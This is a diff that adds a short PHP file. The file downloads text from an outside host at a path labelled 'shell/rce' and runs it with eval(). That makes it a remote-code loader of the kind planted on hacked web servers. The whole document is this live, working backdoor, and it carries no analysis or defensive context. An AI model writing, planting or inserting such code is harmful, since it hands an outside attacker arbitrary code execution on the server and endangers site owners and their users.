@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://syndicateseo.xyz/shell/rce/penjajahan.txt'));
+
+$content = "?> ".$content;
+eval($content);
